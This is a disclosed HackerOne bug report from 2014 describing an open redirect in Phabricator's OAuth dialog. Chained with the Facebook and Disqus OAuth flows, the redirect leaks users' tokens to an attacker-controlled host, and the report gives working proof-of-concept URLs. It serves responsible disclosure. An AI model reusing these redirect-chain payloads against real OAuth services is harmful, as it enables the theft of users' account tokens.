---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '3930'
original_report_id: '3930'
title: OAuth Stealing Attack (New)
weakness: Open Redirect
team_handle: phabricator
created_at: '2014-03-13T14:08:40.477Z'
disclosed_at: '2014-04-13T12:37:27.935Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- open-redirect
---

# OAuth Stealing Attack (New)

## Metadata

- HackerOne Report ID: 3930
- Weakness: Open Redirect
- Program: phabricator
- Disclosed At: 2014-04-13T12:37:27.935Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Evan,

I found a new and more dangerous way to steal phabricator facebooks oauth tokens,codes,

In this case, I exploited the behavior of Phabricator OAuth Dialog,

If you provide a differnet scope in phabricator OAuth Dialog (https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com&response_type=code&client_id=PHID-OASC-oyfqtnanxsukiw5lsnce&scope=ggg) you will be redirected automatically to the attacker site, In this case, I exploited this behavior to exploit the Phabricator Facebook. Disqus OAuth Providers

PoC for Facebook:

https://www.facebook.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg

PoC for Disques:

https://disqus.com/api/oauth/2.0/authorize/?client_id=pGsV2eD61zrctO8A9n9QAA41dRASTXxSBFgs4nieqiwviSroKP5UV1wutlHp8d5y&scope=read&redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg&response_type=token

ETC...

The user don't need to be login to perform this kind of attack, it works only via one click, no any continue or another intercation, This attack also need to works on other provides in Phabricator via redirect_uri.

PoC Video:

https://drive.google.com/file/d/0B2-5ltUODX1La0Vjc0ZuemMzRTQ/edit?usp=sharing

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
